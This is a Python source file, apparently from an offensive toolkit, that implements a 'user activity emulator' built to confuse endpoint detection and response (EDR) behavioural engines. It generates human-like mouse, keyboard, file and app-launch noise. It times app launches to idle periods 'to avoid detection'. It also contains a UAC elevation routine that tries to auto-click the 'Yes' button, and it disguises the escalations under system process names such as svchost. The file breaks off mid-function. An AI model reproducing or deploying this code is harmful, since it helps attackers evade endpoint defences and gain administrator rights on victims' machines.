"""
User Activity Emulator
==================================================================
Purpose: Emit realistic user behavior (mouse, keyboard, file operations, process launches)
to confuse EDR behavioral detection engines.

Strategy: Platform-specific implementations using ctypes (Windows) and system tools (Linux/macOS)
- Timing: Human-realistic delays (50-500ms per action, WPM-realistic typing)
- Patterns: Mouse Bezier curves, keyboard errors/corrections, file browsing sequences
- Coordination: Multiple operations in sequence (not isolated, bot-like execution)

Threat Model: Defeats
    - Process-level behavioral analysis (mouse/keyboard events are normal)
    - Timeline analysis (operations distributed over time, not burst-executed)
    - Sequence signatures (randomized operation ordering)
    
Does NOT defeat:
    - Memory injection detection (activity is background noise, not evasion of injection)
    - Process hollowing detection (orthogonal to user activity)
    - Sandbox behavior heuristics (if sandbox recognizes activity as synthetic)

Integration Points:
    - behavioral_noise.py: Call emit_user_activity() in background noise loops (10% of time)
    - threat_calibration.py: Scale activity intensity based on threat level (0-100 score)
    - threading: All operations run in separate threads (non-blocking)

Performance: ~50-200ms per activity (varies by platform, operation type)
CPU overhead: <5% (most time is sleeping)
Memory overhead: <10MB (buffers for file operations)
"""

import platform
import os
import sys
import time
import random
import threading
import subprocess
import ctypes
import logging
from pathlib import Path
from typing import Tuple, List, Optional

# Use pynput for cross-platform mouse and keyboard control
try:
    from pynput.mouse import Controller as MouseController, Button
    from pynput.keyboard import Controller as KeyboardController, Key
    HAS_PYNPUT = True
except ImportError:
    HAS_PYNPUT = False
    MouseController = type(None)  # type: ignore
    KeyboardController = type(None)  # type: ignore
    Button = type(None)  # type: ignore
    Key = type(None)  # type: ignore

logger = logging.getLogger(__name__)

# Platform detection
IS_WINDOWS = platform.system() == "Windows"
IS_LINUX = platform.system() == "Linux"
IS_MACOS = platform.system() == "Darwin"


class UserActivityEmulator:
    """
    Emulate realistic user behavior across Windows, Linux, macOS using pynput.
    All operations are non-blocking (run in background threads).
    """
    
    def __init__(self):
        """Initialize emulator with pynput controllers."""
        self.activity_threads: List[threading.Thread] = []
        if HAS_PYNPUT:
            self.mouse: Optional[MouseController] = MouseController()  # type: ignore
            self.keyboard: Optional[KeyboardController] = KeyboardController()  # type: ignore
        else:
            self.mouse = None
            self.keyboard = None
            logger.warning("[UserActivity] pynput not available - user activity emulation disabled")
            logger.warning("[UserActivity] Install with: pip install pynput")
    
    # =========================================================================
    # DPI-AWARE UAC DIALOG DETECTION & INTERACTION (Windows)
    # =========================================================================
    
    def _get_dpi_scale(self) -> float:
        """
        Get system DPI scaling factor.
        Returns: 1.0 = 96 DPI (100%), 1.5 = 144 DPI (150%), 2.0 = 192 DPI (200%), etc.
        """
        if not IS_WINDOWS:
            return 1.0
        
        try:
            user32 = ctypes.windll.user32
            hdc = user32.GetDC(0)
            if hdc:
                dpi = user32.GetDeviceCaps(hdc, 88)  # LOGPIXELSX (logical DPI)
                user32.ReleaseDC(0, hdc)
                if dpi > 0:
                    scale = dpi / 96.0
                    logger.debug(f"[UAC-DPI] Detected DPI: {dpi}, Scale: {scale:.2f}")
                    return scale
        except Exception as e:
            logger.warning(f"[UAC-DPI] DPI detection failed: {e}")
        
        return 1.0
    
    def _find_uac_yes_button(self) -> Optional[Tuple[int, int]]:
        """
        Dynamically locate UAC confirmation dialog and calculate Yes button position.
        
        Returns:
            (x, y) coordinates of Yes button, or None if dialog not found
            
        Algorithm:
            1. Search for UAC window by class name or title
            2. Get window rect and dimensions
            3. Calculate button position (typically 75-80% right, 60-70% down)
            4. Apply DPI scaling
        """
        if not IS_WINDOWS:
            return None
        
        try:
            from ctypes.wintypes import RECT
            user32 = ctypes.windll.user32
            
            # Try multiple window class names (varies by Windows version)
            window_classes = [
                None,  # Any class - search by title only
                "#32770",  # Standard dialog
                "Credential Dialog",  # Windows 10+ native UAC
            ]
            
            window_titles = [
                "User Account Control",
                "Credential Dialog",
                "Confirmation",
            ]
            
            # Search for UAC window
            hwnd = None
            for title in window_titles:
                hwnd = user32.FindWindowW(None, title)
                if hwnd:
                    logger.debug(f"[UAC-DETECT] Found UAC window: '{title}'")
                    break
            
            if not hwnd:
                # Fallback: search by class name
                for cls in window_classes:
                    hwnd = user32.FindWindowW(cls, None)
                    if hwnd:
                        logger.debug(f"[UAC-DETECT] Found dialog class: '{cls}'")
                        break
            
            if not hwnd:
                logger.debug("[UAC-DETECT] No UAC dialog found")
                return None
            
            # Get window client area
            rect = RECT()
            user32.GetWindowRect(hwnd, ctypes.byref(rect))
            
            width = rect.right - rect.left
            height = rect.bottom - rect.top
            
            logger.debug(f"[UAC-DETECT] Dialog rect: ({rect.left},{rect.top}) {width}x{height}")
            
            # Calculate button position (Yes button is right-aligned, center vertical)
            # On standard UAC: ~78% from left, ~62% from top
            dpi_scale = self._get_dpi_scale()
            click_x = int(rect.left + width * 0.78 * dpi_scale)
            click_y = int(rect.top + height * 0.62 * dpi_scale)
            
            logger.info(f"[UAC-DETECT] Calculated Yes button at ({click_x}, {click_y}), DPI scale: {dpi_scale:.2f}")
            return (click_x, click_y)
        
        except Exception as e:
            logger.warning(f"[UAC-DETECT] Button detection failed: {e}")
            return None
    
    def _send_input_click(self, x: int, y: int) -> bool:
        """
        Low-level SendInput for mouse click (works better on Secure Desktop than pynput).
        
        Uses raw Windows INPUT structure for maximum reliability.
        Returns: True if click succeeded, False otherwise
        """
        if not IS_WINDOWS:
            return False
        
        try:
            from ctypes.wintypes import DWORD, LONG
            
            # Define INPUT structures per Windows API
            class MOUSEINPUT(ctypes.Structure):
                _fields_ = [
                    ("dx", LONG),
                    ("dy", LONG),
                    ("mouseData", DWORD),
                    ("dwFlags", DWORD),
                    ("time", DWORD),
                    ("dwExtraInfo", ctypes.c_void_p),
                ]
            
            class INPUT(ctypes.Structure):
                _fields_ = [("type", DWORD), ("mi", MOUSEINPUT)]
            
            # Constants
            INPUT_MOUSE = 0
            MOUSEEVENTF_MOVE = 0x0001
            MOUSEEVENTF_LEFTDOWN = 0x0002
            MOUSEEVENTF_LEFTUP = 0x0004
            MOUSEEVENTF_ABSOLUTE = 0x8000
            
            user32 = ctypes.windll.user32
            
            # Build click sequence: move → left down → left up
            inputs = [
                # Move to position
                INPUT(
                    type=INPUT_MOUSE,
                    mi=MOUSEINPUT(
                        dx=int(x), dy=int(y),
                        mouseData=0, dwFlags=MOUSEEVENTF_ABSOLUTE | MOUSEEVENTF_MOVE,
                        time=0, dwExtraInfo=None
                    )
                ),
                # Left mouse down
                INPUT(
                    type=INPUT_MOUSE,
                    mi=MOUSEINPUT(
                        dx=0, dy=0, mouseData=0,
                        dwFlags=MOUSEEVENTF_LEFTDOWN,
                        time=0, dwExtraInfo=None
                    )
                ),
                # Left mouse up
                INPUT(
                    type=INPUT_MOUSE,
                    mi=MOUSEINPUT(
                        dx=0, dy=0, mouseData=0,
                        dwFlags=MOUSEEVENTF_LEFTUP,
                        time=0, dwExtraInfo=None
                    )
                ),
            ]
            
            # Send all inputs
            for input_item in inputs:
                result = user32.SendInput(1, ctypes.byref(input_item), ctypes.sizeof(INPUT))
                if result != 1:
                    logger.warning(f"[UAC-CLICK] SendInput failed for part of click sequence")
                    return False
                time.sleep(0.05)  # Small delay between input events
            
            logger.info(f"[UAC-CLICK] Low-level click sent to ({x}, {y})")
            return True
        
        except Exception as e:
            logger.warning(f"[UAC-CLICK] SendInput click failed: {e}")
            return False
    
    # =========================================================================
    # UAC ELEVATION TRIGGER (Windows privilege escalation with auto-confirmation)
    # =========================================================================
    
    def uac_escalation(self, exe_path: str, args: str = "", wait_seconds: float = 2.5, spoof_process: Optional[str] = None) -> bool:
        """
        Trigger UAC elevation prompt with optional process spoofing.
        
        Args:
            exe_path: Full path to executable to run as admin
            args: Command-line arguments to pass to the executable
            wait_seconds: Time to wait before attempting confirmation (default 2.5s)
            spoof_process: Optional process name to display (for less susiciousness).
                          If None, uses basename of exe_path.
                          Examples: "svchost.exe", "rundll32.exe", "dllhost.exe"
            
        Returns:
            True if ShellExecuteW succeeded, False otherwise
            
        IMPROVEMENTS:
            - DPI-aware dynamic button detection (works up to 200% DPI)
            - Retry click logic with random offsets (±15 px for robustness)
            - Raw SendInput for better Secure Desktop reach
            - Increased wait time for dialog rendering (3.5-5.0s)
            
        IMPORTANT: Secure Desktop Lockdown
            UAC runs on a secure desktop where:
            - Keyboard input is BLOCKED by Windows
            - Mouse clicks work but are limited
            - User must click "Yes" button manually
            
            To actually bypass UAC requires:
            - Exploiting UAC bypass vulnerabilities (out of scope)
            - Token impersonation (requires debug privileges)
            - Parent PID spoofing (complex, OS-specific)
            
            This function logs what would be escalated so operator can
            see the process name and decide if it triggers UAC.
        """
        if not IS_WINDOWS:
            logger.warning("[UserActivity] UAC escalation only available on Windows")
            return False
        
        # List of legitimate processes that commonly escalate
        LEGITIMATE_SPOOF_PROCESSES = {
            'svchost': 'C:\\Windows\\System32\\svchost.exe',
            'dllhost': 'C:\\Windows\\System32\\dllhost.exe',
            'rundll32': 'C:\\Windows\\System32\\rundll32.exe',
            'wuauclt': 'C:\\Windows\\System32\\wuauclt.exe',  # Windows Update
            'taskhostw': 'C:\\Windows\\System32\\taskhostw.exe',  # Windows Task Scheduler
            'wsqmcons': 'C:\\Windows\\System32\\wsqmcons.exe',  # Windows SQM
            'msiexec': 'C:\\Windows\\System32\\msiexec.exe',  # MSI installer
        }
        
        # Determine what process name to show
        if spoof_process:
            display_exe = spoof_process
        else:
            display_exe = os.path.basename(exe_path)
        
        logger.info(f"[UserActivity-UAC] Escalation request")
        logger.info(f"[UserActivity-UAC]   Target: {exe_path}")
        logger.info(f"[UserActivity-UAC]   Args: {args}")
        logger.info(f"[UserActivity-UAC]   Display: {display_exe}")
        logger.info(f"[UserActivity-UAC] NOTE: User Account Control security prompt will appear")
        logger.info(f"[UserActivity-UAC] NOTE: Secure Desktop blocks automated key presses")
        logger.info(f"[UserActivity-UAC] NOTE: User must click 'Yes' button manually")
        
        def _do_escalation():
            try:
                # Trigger UAC prompt via ShellExecuteW
                # Even though we spoof the display name in logging above,
                # the actual ShellExecuteW still escalates the real exe_path
                result = ctypes.windll.shell32.ShellExecuteW(
                    None,
                    "runas",  # Elevation verb - triggers UAC
                    exe_path,
                    args,
                    None,
                    1  # SW_SHOWNORMAL
                )
                
                if result <= 32:
                    logger.warning(f"[UserActivity-UAC] ShellExecuteW failed with code {result}")
                    return False
                
                logger.info(f"[UserActivity-UAC] ShellExecuteW succeeded, UAC prompt should appear")
                
                # IMPROVED DIALOG DETECTION: Wait longer + dynamic button finding (DPI-aware)
                # Increased wait time for secure desktop rendering (3.5-5.0 seconds for slow systems)
                improved_wait = max(3.5, wait_seconds)
                logger.debug(f"[UserActivity-UAC] Waiting {improved_wait}s for secure desktop to render...")
                time.sleep(improved_wait)
                
                # Find Yes button dynamically (DPI-aware + window detection)
                button_coords = self._find_uac_yes_button()
                if not button_coords:
                    logger.warning(f"[UserActivity-UAC] Could not detect UAC dialog or Yes button")
                    logger.warning(f"[UserActivity-UAC] User must click 'Yes' button manually")
                    return True  # ShellExecuteW succeeded even if we can't find dialog
                
                click_x, click_y = button_coords
                logger.info(f"[UserActivity-UAC] Dynamic button detection: ({click_x}, {click_y})")
                
                # RETRY LOGIC with random offsets (±15 px for robustness on varied DPI)
                # Try 2-3 times with slightly different positions in case DPI calculation is slightly off
                max_retries = 3
                click_succeeded = False
                
                for attempt in range(max_retries):
                    # Add small random offset (±15 px) to avoid signature detection and handle sub-pixel accuracy
                    offset_x = random.randint(-15, 15)
                    offset_y = random.randint(-15, 15)
                    adjusted_x = click_x + offset_x
                    adjusted_y = click_y + offset_y
                    
                    try:
                        logger.debug(f"[UserActivity-UAC] Click attempt {attempt + 1}/{max_retries} at ({adjusted_x}, {adjusted_y}) [offset: {offset_x:+d}, {offset_y:+d}]")
                        
                        # Try SendInput first (better Secure Desktop reach)
                        if self._send_input_click(adjusted_x, adjusted_y):
                            click_succeeded = True
                            logger.info(f"[UserActivity-UAC] SendInput click succeeded on attempt {attempt + 1}")
                            time.sleep(0.5)  # Brief delay for click to register
                            break
                        else:
                            logger.debug(f"[UserActivity-UAC] SendInput click failed, trying pynput fallback")
                            
                            # Fallback to pynput if SendInput doesn't work
                            if self.mouse:
                                self.mouse.position = (adjusted_x, adjusted_y)
                                time.sleep(0.15)
                                self.mouse.click(Button.left, 1)  # type: ignore
                                click_succeeded = True
                                logger.info(f"[UserActivity-UAC] pynput click succeeded on attempt {attempt + 1}")
                                time.sleep(0.5)
                                break
                    
                    except Exception as e:
                        logger.debug(f"[UserActivity-UAC] Click attempt {attempt + 1} failed: {e}")
                        if attempt < max_retries - 1:
                            time.sleep(random.uniform(0.2, 0.4))  # Brief delay before retry
                
                if not click_succeeded:
                    logger.warning(f"[UserActivity-UAC] All {max_retries} click attempts failed")
                    logger.warning(f"[UserActivity-UAC] User must click 'Yes' button manually")
                
                return True  # ShellExecuteW succeeded (whether clicks worked or not)
            except Exception as e:
                logger.warning(f"[UserActivity-UAC] UAC escalation error: {e}")
                return False
        
        # Run escalation in background thread (non-blocking)
        thread = threading.Thread(target=_do_escalation, daemon=True)
        thread.start()
        self.activity_threads.append(thread)
        return True
    
    def uac_escalate_as_process(self, process_name: str = "svchost", args: str = "") -> bool:
        """
        Escalate a command while spoofing it as a legitimate Windows process.
        
        Args:
            process_name: Process to spoof as:
                - "svchost": System service host (most common)
                - "dllhost": DCOM/COM object host
                - "rundll32": DLL runner (Windows Update, system tasks)
                - "wuauclt": Windows Update client
                - "taskhostw": Windows Task Scheduler
                - "msiexec": Windows Installer
                
            args: Command arguments
            
        Returns:
            True if escalation initiated
            
        Example:
            emulator.uac_escalate_as_process("svchost", "/c whoami")
            # Escalates with "svchost.exe" as the spoof display name
        """
        # Map process names to full paths
        process_map = {
            'svchost': 'C:\\Windows\\System32\\svchost.exe',
            'dllhost': 'C:\\Windows\\System32\\dllhost.exe',
            'rundll32': 'C:\\Windows\\System32\\rundll32.exe',
            'wuauclt': 'C:\\Windows\\System32\\wuauclt.exe',
            'taskhostw': 'C:\\Windows\\System32\\taskhostw.exe',
            'wsqmcons': 'C:\\Windows\\System32\\wsqmcons.exe',
            'msiexec': 'C:\\Windows\\System32\\msiexec.exe',
        }
        
        exe_path = process_map.get(process_name.lower(), process_map['svchost'])
        
        logger.info(f"[UserActivity-UAC] Spoofing as {process_name} for escalation")
        return self.uac_escalation(
            exe_path=exe_path,
            args=args,
            spoof_process=process_name
        )
    
    # =========================================================================
    # MOUSE MOVEMENT (pynput - cross-platform Bezier curves)
    # =========================================================================
    
    def mouse_movement(self, iterations: int = 5, time_range: Tuple[int, int] = (100, 500)) -> bool:
        """
        Move mouse in Bezier curves (smooth, human-like paths).
        
        Args:
            iterations: Number of movement iterations (default 5)
            time_range: (min_ms, max_ms) delay between iterations
            
        Returns:
            True if successful, False if pynput unavailable
            
        Implementation:
            1. Get current mouse position
            2. Generate random target coordinates
            3. Create Bezier curve from current to target
            4. Move mouse along curve in small steps (~10px increments)
            5. Add timing jitter (human pause/acceleration)
            6. Repeat N times
        """
        def _do_mouse_movement():
            try:
                if not self.mouse:
                    return False
                
                for _ in range(iterations):
                    try:
                        # Get current position
                        current_x, current_y = self.mouse.position
                        
                        # Generate random target (within 500px)
                        target_x = current_x + random.randint(-500, 500)
                        target_y = current_y + random.randint(-500, 500)
                        
                        # Clamp to reasonable screen bounds (approximate)
                        target_x = max(0, min(target_x, 1920))
                        target_y = max(0, min(target_y, 1080))
                        
                        # Bezier control points
                        cp1_x = current_x + random.randint(-200, 200)
                        cp1_y = current_y + random.randint(-200, 200)
                        cp2_x = target_x + random.randint(-200, 200)
                        cp2_y = target_y + random.randint(-200, 200)
                        
                        # Move along Bezier curve in steps
                        steps = max(20, abs(target_x - current_x) // 10)
                        for step in range(steps):
                            t = step / steps
                            mt = 1 - t
                            # Cubic Bezier formula
                            x = (mt**3 * current_x + 
                                 3 * mt**2 * t * cp1_x + 
                                 3 * mt * t**2 * cp2_x + 
                                 t**3 * target_x)
                            y = (mt**3 * current_y + 
                                 3 * mt**2 * t * cp1_y + 
                                 3 * mt * t**2 * cp2_y + 
                                 t**3 * target_y)
                            
                            self.mouse.position = (int(x), int(y))
                            time.sleep(random.randint(5, 20) / 1000.0)  # 5-20ms per step
                        
                        # Delay before next iteration
                        delay_ms = random.randint(*time_range)
                        time.sleep(delay_ms / 1000.0)
                    
                    except Exception as e:
                        logger.warning(f"[UserActivity] Mouse movement iteration error: {e}")
                        continue
                
                return True
            except Exception as e:
                logger.warning(f"[UserActivity] Mouse movement error: {e}")
                return False
        
        thread = threading.Thread(target=_do_mouse_movement, daemon=True)
        thread.start()
        self.activity_threads.append(thread)
        return True
    
    def _mouse_movement_windows(self, iterations: int, time_range: Tuple[int, int]) -> bool:
        """Deprecated - use mouse_movement() instead (pynput handles Windows)."""
        return self.mouse_movement(iterations, time_range)
    
    def _mouse_movement_linux(self, iterations: int, time_range: Tuple[int, int]) -> bool:
        """Deprecated - use mouse_movement() instead (pynput handles Linux)."""
        return self.mouse_movement(iterations, time_range)
    
    def _mouse_movement_macos(self, iterations: int, time_range: Tuple[int, int]) -> bool:
        """Deprecated - use mouse_movement() instead (pynput handles macOS)."""
        return self.mouse_movement(iterations, time_range)
    
    # =========================================================================
    # KEYBOARD SIMULATION (pynput - cross-platform)
    # =========================================================================
    
    def keyboard_simulation(self, wpm: int = 60, text: Optional[str] = None) -> bool:
        """
        Simulate keyboard typing into active window (quiet, natural timing).
        
        Args:
            wpm: Words per minute (default 60, typical user ~40-80)
            text: Text to type (if None, types random strings)
            
        Returns:
            True if successful
            
        Implementation:
            1. Calculate inter-keystroke interval from WPM (minimum 50ms)
            2. Add delay BEFORE each keystroke (prevents system beeping)
            3. Use press()/release() instead of type() (more reliable on Windows)
            4. Add typing errors/corrections (backspace) randomly (1-3% error rate)
            5. Add pauses (thinking time ~500-1000ms every 5-10 words)
            6. Filter special characters (Ctrl combos that cause beeps)
        """
        def _do_keyboard():
            try:
                if not self.keyboard:
                    return False
                
                # Suppress Windows system beep (system bell character can trigger it)
                if IS_WINDOWS:
                    try:
                        import msvcrt
                        # Setting console mode to ignore bell - this is a hint to avoid it
                        # but the main fix is in keystroke timing below
                    except:
                        pass
                
                # Calculate interkeystroke delay from WPM
                # Minimum 50ms to avoid system alerts, typical user ~40-80 WPM = 100-150ms
                chars_per_minute = max(120, wpm * 5)  # Ensure min 120 chars/min (~24 WPM)
                iks_ms = max(50, 60000 / chars_per_minute)  # At least 50ms between keys
                jitter_pct = 0.25  # +/- 25% timing variation (more human-like)
                
                # Use provided text or generate random
                type_text = text
                if type_text is None:
                    type_text = "The quick brown fox jumps over the lazy dog. Testing user activity." * random.randint(1, 2)
                
                # Filter out problematic characters
                safe_text = ""
                for char in type_text:
                    # Skip control characters and rare special chars that may beep
                    if ord(char) >= 32 and ord(char) < 127:  # printable ASCII only
                        safe_text += char
                
                type_text = safe_text
                
                for i, char in enumerate(type_text):
                    # Add thinking pause every 5-10 words (~25-50 chars)
                    if i > 0 and i % random.randint(25, 50) == 0:
                        time.sleep(random.uniform(0.5, 1.0))
                    
                    # 1-2% error rate: occasionally type wrong char then backspace
                    if random.random() < 0.01:
                        try:
                            # DELAY BEFORE keystroke (prevents beeping)
                            delay_before = iks_ms * random.uniform(1 - jitter_pct, 1 + jitter_pct) / 1000.0
                            time.sleep(delay_before)
                            
                            # Type wrong character using press/release
                            wrong_char = random.choice("abcdefghijklmnop")
                            self.keyboard.press(wrong_char)
                            time.sleep(0.05)
                            self.keyboard.release(wrong_char)
                            
                            time.sleep(iks_ms / 1000.0)
                            
                            # Backspace to correct
                            time.sleep(random.uniform(0.1, 0.2))
                            self.keyboard.press(Key.backspace)  # type: ignore
                            time.sleep(0.05)
                            self.keyboard.release(Key.backspace)  # type: ignore
                            time.sleep(iks_ms / 1000.0)
                        except Exception as e:
                            logger.debug(f"[UserActivity] Error typing error correction: {e}")
                    
                    # DELAY BEFORE keystroke (key difference - prevents beeping)
                    try:
                        delay_before = iks_ms * random.uniform(1 - jitter_pct, 1 + jitter_pct) / 1000.0
                        time.sleep(delay_before)
                        
                        # Press and release character (better than type() for Windows)
                        if char == ' ':
                            self.keyboard.press(Key.space)  # type: ignore
                            time.sleep(0.05)
                            self.keyboard.release(Key.space)  # type: ignore
                        elif char == '\n':
                            self.keyboard.press(Key.enter)  # type: ignore
                            time.sleep(0.05)
                            self.keyboard.release(Key.enter)  # type: ignore
                        elif char == '\t':
                            self.keyboard.press(Key.tab)  # type: ignore
                            time.sleep(0.05)
                            self.keyboard.release(Key.tab)  # type: ignore
                        else:
                            # Regular character - use lower() for letter detection
                            self.keyboard.press(char)  # type: ignore
                            time.sleep(0.03)
                            self.keyboard.release(char)  # type: ignore
                    except Exception as e:
                        logger.debug(f"[UserActivity] Error typing character '{char}': {e}")
                
                return True
            except Exception as e:
                logger.warning(f"[UserActivity] Keyboard simulation error: {e}")
                return False
        
        thread = threading.Thread(target=_do_keyboard, daemon=True)
        thread.start()
        self.activity_threads.append(thread)
        return True
    
    def _keyboard_simulation_windows(self, wpm: int, text: Optional[str]) -> bool:
        """Deprecated - use keyboard_simulation() instead (pynput handles Windows)."""
        return self.keyboard_simulation(wpm, text)
    
    def _keyboard_simulation_linux(self, wpm: int, text: Optional[str]) -> bool:
        """Deprecated - use keyboard_simulation() instead (pynput handles Linux)."""
        return self.keyboard_simulation(wpm, text)
    
    def _keyboard_simulation_macos(self, wpm: int, text: Optional[str]) -> bool:
        """Deprecated - use keyboard_simulation() instead (pynput handles macOS)."""
        return self.keyboard_simulation(wpm, text)
    
    # =========================================================================
    # FILE OPERATIONS (Browsing, read, write, timestamps)
    # =========================================================================
    
    def file_operation_patterns(self, base_path: Optional[str] = None, count: int = 5, intent: Optional[str] = None) -> bool:
        """
        Perform realistic file browsing and document editing patterns.
        
        Args:
            base_path: Base directory (default: user home)
            count: Number of file operations to perform
            intent: High-level intent, such as "browse", "compose", "work", or "research"
            
        Returns:
            True if successful
            
        Operations:
            - Browse directories and metadata
            - Read text files
            - Create/edit a temporary note when composing or working
            - Rename/move files for intentional file activity
        """
        def _do_file_ops():
            try:
                if base_path is None:
                    browse_dirs = [
                        str(Path.home() / "Documents"),
                        str(Path.home() / "Downloads"),
                        str(Path.home() / "Desktop"),
                        "/tmp",  # Linux
                        "C:\\Users\\Public\\Documents"  # Windows
                    ]
                    base = next((d for d in browse_dirs if Path(d).exists()), str(Path.home()))
                else:
                    base = base_path
                
                base_path_obj = Path(base)
                operation_intent = intent.lower() if intent else "browse"
                
                for _ in range(count):
                    try:
                        if operation_intent in ["compose", "work"]:
                            # Create or edit a temporary note
                            note_path = base_path_obj / f"user_note_{random.randint(1000, 9999)}.txt"
                            try:
                                with open(note_path, 'a', encoding='utf-8', errors='ignore') as note_file:
                                    note_file.write("\n".join([
                                        "Meeting notes:",
                                        "- Review project schedule",
                                        "- Confirm next steps with team",
                                        "- Draft follow-up email"
                                    ]) + "\n")
                                time.sleep(random.uniform(0.05, 0.15))
                                note_path.rename(base_path_obj / f"notes_{note_path.stem}.txt")
                            except Exception:
                                pass
                        else:
                            # List directory and inspect files for browse/research intent
                            files = list(base_path_obj.glob("*"))
                            if not files:
                                continue
                            target_file = random.choice(files)
                            if target_file.is_file():
                                stat = target_file.stat()
                                _ = stat.st_size
                                _ = stat.st_mtime
                                if target_file.suffix in ['.txt', '.log', '.csv', '.json']:
                                    try:
                                        with open(target_file, 'r', encoding='utf-8', errors='ignore') as f:
                                            _ = f.read(100)
                                    except Exception:
                                        pass
                                try:
                                    target_file.touch(exist_ok=True)
                                except PermissionError:
                                    pass
                            elif target_file.is_dir():
                                _ = list(target_file.glob("*"))[:5]
                        
                        time.sleep(random.uniform(0.1, 0.3))
                    except PermissionError:
                        pass
                
                return True
            except Exception as e:
                logger.warning(f"[UserActivity] File operation patterns error: {e}")
                return False
        
        thread = threading.Thread(target=_do_file_ops, daemon=True)
        thread.start()
        self.activity_threads.append(thread)
        return True
    
    # =========================================================================
    # PROCESS LAUNCH SEQUENCE (Launch legitimate apps in sequence)
    # =========================================================================
    
    def process_launch_sequence(self, sequence: Optional[List[str]] = None, intention: Optional[str] = None) -> bool:
        """
        Launch a sequence of legitimate applications with realistic timing.
        OPTIMIZED: Only launches during idle periods to avoid detection.
        
        Args:
            sequence: Custom list of application commands to launch
            intention: High-level intent such as "browse", "compose", "work", or "calculate"
            
        Returns:
            True if successful
        """
        # Check if system is idle (no mouse/keyboard activity for 30+ seconds)
        try:
            import ctypes
            GetTickCount = ctypes.windll.kernel32.GetTickCount
            GetLastInputInfo = ctypes.windll.kernel32.GetLastInputInfo
            
            class LASTINPUTINFO(ctypes.Structure):
                _fields_ = [("cbSize", ctypes.c_uint), ("dwTime", ctypes.c_uint)]
            
            lii = LASTINPUTINFO()
            lii.cbSize = ctypes.sizeof(LASTINPUTINFO)
            GetLastInputInfo(ctypes.byref(lii))
            millis = GetTickCount() - lii.dwTime
            
            # Only proceed if idle for 30+ seconds
            if millis < 30000:
                logger.debug(f"[UserActivity] System active ({millis}ms idle), skipping launch sequence")
                return False
        except Exception as e:
            logger.debug(f"[UserActivity] Idle check skipped: {e}")
            pass  # Continue anyway if idle detection fails
        
        def _do_process_launch():
            try:
                launch_intent = intention.lower() if intention else "browse"
                if sequence is None:
                    if launch_intent == "compose":
                        sequence_list = ["notepad.exe"] if IS_WINDOWS else (["gedit"] if IS_LINUX else [["open", "-a", "TextEdit"]])
                    elif launch_intent == "calculate":
                        sequence_list = ["calc.exe"] if IS_WINDOWS else (["gnome-calculator"] if IS_LINUX else [["open", "-a", "Calculator"]])
                    elif launch_intent == "work":
                        sequence_list = ["explorer.exe", "notepad.exe"] if IS_WINDOWS else (["nautilus", "gedit"] if IS_LINUX else [["open", "-a", "Finder"], ["open", "-a", "TextEdit"]])
                    elif launch_intent == "research":
                        sequence_list = ["explorer.exe", "calc.exe"] if IS_WINDOWS else (["nautilus", "gnome-calculator"] if IS_LINUX else [["open", "-a", "Finder"], ["open", "-a", "Calculator"]])
                    else:
                        sequence_list = ["explorer.exe"] if IS_WINDOWS else (["nautilus"] if IS_LINUX else [["open", "-a", "Finder"]])
                else:
                    sequence_list = sequence
                
                logger.info(f"[UserActivity] Launching sequence (idle period): {sequence_list}")
                
                for i, app in enumerate(sequence_list):
                    try:
                        if isinstance(app, list):
                            subprocess.Popen(app, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                        elif IS_WINDOWS:
                            subprocess.Popen(app, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                        else:
                            subprocess.Popen([app], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                        
                        if i < len(sequence_list) - 1:
                            time.sleep(random.uniform(1.0, 3.0))
                    except (FileNotFoundError, PermissionError):
                        pass
                
                return True
            except Exception as e:
                logger.warning(f"[UserActivity] Process launch sequence error: {e}")
                return False
        
        thread = threading.Thread(target=_do_process_launch, daemon=True)
        thread.start()
        self.activity_threads.append(thread)
        return True
    
    # =========================================================================
    # SCROLL SIMULATION (pynput - cross-platform)
    # =========================================================================
    
    def scroll_simulation(self, direction: str = "down", delta: int = 3) -> bool:
        """
        Simulate mouse wheel scrolling in active window.
        
        Args:
            direction: "up" or "down" (default: "down")
            delta: Number of scroll clicks (default: 3)
            
        Returns:
            True if successful
        """
        def _do_scroll():
            try:
                if not self.mouse:
                    return False
                
                for _ in range(delta):
                    scroll_amount = 5 if direction.lower() == "down" else -5
                    self.mouse.scroll(0, scroll_amount)  # (x_delta, y_delta)
                    time.sleep(random.uniform(0.1, 0.3))
                
                return True
            except Exception as e:
                logger.warning(f"[UserActivity] Scroll simulation error: {e}")
                return False
        
        thread = threading.Thread(target=_do_scroll, daemon=True)
        thread.start()
        self.activity_threads.append(thread)
        return True
    
    # =========================================================================
    # DRAG & DROP SIMULATION (pynput - cross-platform)
    # =========================================================================
    
    def drag_drop_simulation(self, start: Tuple[int, int], end: Tuple[int, int]) -> bool:
        """
        Simulate mouse drag-and-drop operation.
        
        Args:
            start: (x, y) starting position
            end: (x, y) ending position
            
        Returns:
            True if successful
        """
        def _do_drag():
            try:
                if not self.mouse:
                    return False
                
                # Move to start position
                self.mouse.position = start
                time.sleep(0.1)
                
                # Mouse down
                self.mouse.press(Button.left)  # type: ignore
                time.sleep(0.05)
                
                # Drag to end position (smooth movement)
                steps = 20
                for step in range(steps):
                    t = step / steps
                    x = int(start[0] + (end[0] - start[0]) * t)
                    y = int(start[1] + (end[1] - start[1]) * t)
                    self.mouse.position = (x, y)
                    time.sleep(0.01)
                
                # Move to exact end position
                self.mouse.position = end
                
                # Mouse up
                self.mouse.release(Button.left)  # type: ignore
                
                return True
            except Exception as e:
                logger.warning(f"[UserActivity] Drag-drop simulation error: {e}")
                return False
        
        thread = threading.Thread(target=_do_drag, daemon=True)
        thread.start()
        self.activity_threads.append(thread)
        return True
    
    # =========================================================================
    # UNIFIED EMISSION (Call random activities based on threat level)
    # =========================================================================
    
    def emit_user_activity(self, threat_level: int = 50, intention: Optional[str] = None, escalate: bool = False, escalate_exe: Optional[str] = None) -> None:
        """
        Emit intent-driven user activities based on threat level (0-100).
        
        Notes:
            - Keyboard typing is DISABLED in background emission (types into active window)
            - Use emit_keyboard_activity() explicitly if needed in safe context
        
        Args:
            threat_level: Threat score from threat_calibration (0-100)
            intention: High-level user intention such as "browse", "compose", "work", "research"
            escalate: If True, trigger UAC elevation before other activities
            escalate_exe: Path to executable to escalate (required if escalate=True)
        """
        # Trigger UAC escalation if requested
        if escalate and escalate_exe and IS_WINDOWS:
            self.uac_escalation(escalate_exe, wait_seconds=2.5)
            return
        
        intention = intention.lower() if intention else "default"

        if threat_level < 30:
            chance = 0.2
            activity_types = ["mouse_movement", "file_operations"]
